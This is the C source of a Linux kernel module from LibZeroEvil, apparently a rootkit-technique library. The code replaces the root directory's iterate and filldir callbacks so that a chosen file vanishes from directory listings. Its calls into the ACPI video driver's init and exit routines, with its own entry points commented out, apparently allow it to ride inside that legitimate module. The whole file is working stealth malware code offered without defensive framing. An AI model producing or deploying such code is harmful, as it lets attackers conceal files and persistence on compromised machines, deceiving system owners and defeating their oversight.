// Copyright 2016 Gu Zhengxiong <rectigu@gmail.com>
//
// This file is part of LibZeroEvil.
//
// LibZeroEvil is free software:
// you can redistribute it and/or modify it
// under the terms of the GNU General Public License
// as published by the Free Software Foundation,
// either version 3 of the License,
// or (at your option) any later version.
//
// LibZeroEvil is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with LibZeroEvil.
// If not, see <http://www.gnu.org/licenses/>.


# ifndef CPP
# include <linux/module.h>
# include <linux/kernel.h>
# include <linux/fs.h> // filp_open, filp_close.
# endif // CPP

# include "zeroevil/zeroevil.h"


MODULE_LICENSE("GPL");

# define ROOT_PATH "/"
# define SECRET_FILE "032416_525.mp4"

int
(*real_iterate)(struct file *filp, struct dir_context *ctx);
int
(*real_filldir)(struct dir_context *ctx,
                const char *name, int namlen,
                loff_t offset, u64 ino, unsigned d_type);

int
fake_iterate(struct file *filp, struct dir_context *ctx);
int
fake_filldir(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type);

extern __init int
acpi_video_init(void);
extern __exit void
acpi_video_exit(void);


__init int
fshid_init(void)
{
    acpi_video_init();

    fm_alert("%s\n", "Greetings the World!");

    set_file_op(iterate, ROOT_PATH, fake_iterate, real_iterate);

    if (!real_iterate) {
        return -ENOENT;
    }

    return 0;
}


__exit void
fshid_exit(void)
{
    acpi_video_exit();

    if (real_iterate) {
        void *dummy;
        set_file_op(iterate, ROOT_PATH, real_iterate, dummy);
    }

    fm_alert("%s\n", "Farewell the World!");
    return;
}


/* module_init(fshid_init); */
/* module_exit(fshid_exit); */


int
fake_iterate(struct file *filp, struct dir_context *ctx)
{
    real_filldir = ctx->actor;
    *(filldir_t *)&ctx->actor = fake_filldir;

    return real_iterate(filp, ctx);
}


int
fake_filldir(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type)
{
    if (strcmp(name, SECRET_FILE) == 0) {
        fm_alert("Hiding: %s", name);
        return 0;
    }

    /* pr_cont("%s ", name); */

    return real_filldir(ctx, name, namlen, offset, ino, d_type);
}
